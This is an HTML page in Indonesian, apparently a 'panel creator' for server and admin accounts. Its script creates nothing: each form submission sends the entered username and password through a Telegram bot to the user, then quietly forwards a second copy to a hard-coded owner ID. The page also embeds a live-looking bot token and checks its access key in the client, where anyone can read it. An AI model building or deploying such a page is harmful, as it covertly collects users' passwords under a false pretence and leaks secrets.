<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ZANDKAV ADP Panel Creator</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #000428;
      background: linear-gradient(to right, #004e92, #000428);
      color: white;
      text-align: center;
      padding: 2rem;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 2rem;
      background: rgba(0,0,0,0.5);
      border-radius: 1rem;
      box-shadow: 0 0 20px #00f2ff;
    }
    h1 {
      color: #00f2ff;
    }
    input, select, button {
      width: 100%;
      padding: 1rem;
      margin: 0.5rem 0;
      border: none;
      border-radius: 0.5rem;
      font-size: 1rem;
    }
    button {
      background-color: #00f2ff;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #00bbcc;
    }
    #main, #panelForm, #adminForm {
      display: none;
    }
  </style>
</head>
<body>
  <div id="loginForm" class="container">
    <h1>Masukkan Akses Kunci</h1>
    <input type="text" id="accessKey" placeholder="Contoh: ZANDKAV ADP" />
    <button onclick="checkAccess()">Masuk</button>
  </div>  <div id="main" class="container">
    <h1>Selamat Datang</h1>
    <button onclick="showPanelForm()">Create Panel</button>
    <button onclick="showAdminForm()">Create Admin Panel</button>
  </div>  <div id="panelForm" class="container">
    <h1>Create Panel (SERVER)</h1>
    <input type="text" id="panelUser" placeholder="Username" />
    <input type="text" id="panelPass" placeholder="Password" />
    <select id="panelRam">
      <option value="unli">Unlimited RAM</option>
      <option value="1gb">1GB</option>
      <option value="2gb">2GB</option>
      <option value="5gb">5GB</option>
      <option value="10gb">10GB</option>
    </select>
    <input type="text" id="panelTele" placeholder="Telegram ID" />
    <button onclick="submitPanel()">Kirim</button>
  </div>  <div id="adminForm" class="container">
    <h1>Create Admin Panel (USER)</h1>
    <input type="text" id="adminUser" placeholder="Username" />
    <input type="text" id="adminPass" placeholder="Password" />
    <input type="text" id="adminTele" placeholder="Telegram ID" />
    <button onclick="submitAdminPanel()">Kirim</button>
  </div>  <script>
    const botToken = '8081519323:AAGoTfh5TIC-TznGmfBYeFKNnpQDMNl-AxM';
    const ownerId = '7849712634';
    const panelUrl = 'https://pinzyprivate.otax.store';

    function checkAccess() {
      const key = document.getElementById('accessKey').value.trim();
      if (key === 'ZANDKAV ADP') {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('main').style.display = 'block';
      } else {
        alert('Akses ditolak');
      }
    }

    function showPanelForm() {
      document.getElementById('main').style.display = 'none';
      document.getElementById('panelForm').style.display = 'block';
    }

    function showAdminForm() {
      document.getElementById('main').style.display = 'none';
      document.getElementById('adminForm').style.display = 'block';
    }

    function submitPanel() {
      const user = document.getElementById("panelUser").value;
      const pass = document.getElementById("panelPass").value;
      const ram = document.getElementById("panelRam").value;
      const tele = document.getElementById("panelTele").value;

      const loginLink = `${panelUrl}/login`;

      // Kirim ke user
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: tele,
          text: `ðŸš€ PANEL TELAH DIBUAT\nUsername: ${user}\nPassword: ${pass}\nRAM: ${ram}\nðŸ”— Login: ${loginLink}`
        })
      })
      .then(() => {
        // Kirim ke owner sebagai history
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ownerId,
            text: `ðŸ“¥ HISTORY PANEL\nUsername: ${user}\nPassword: ${pass}\nRAM: ${ram}\nID Telegram: ${tele}`
          })
        });
        alert("Panel berhasil dibuat dan dikirim!");
      })
      .catch(() => alert("Gagal mengirim panel."));
    }

    function submitAdminPanel() {
      const user = document.getElementById("adminUser").value;
      const pass = document.getElementById("adminPass").value;
      const tele = document.getElementById("adminTele").value;

      const loginLink = `${panelUrl}/admin`;

      // Kirim ke user
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: tele,
          text: `ðŸ‘‘ ADMIN PANEL\nUsername: ${user}\nPassword: ${pass}\nðŸ”— Login: ${loginLink}`
        })
      })
      .then(() => {
        // Kirim ke owner sebagai history
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ownerId,
            text: `ðŸ“¥ HISTORY ADMIN\nUsername: ${user}\nPassword: ${pass}\nID Telegram: ${tele}`
          })
        });
        alert("Admin panel berhasil dikirim ke user dan owner!");
      })
      .catch(() => alert("Gagal mengirim admin panel."));
    }
  </script></body>
</html>
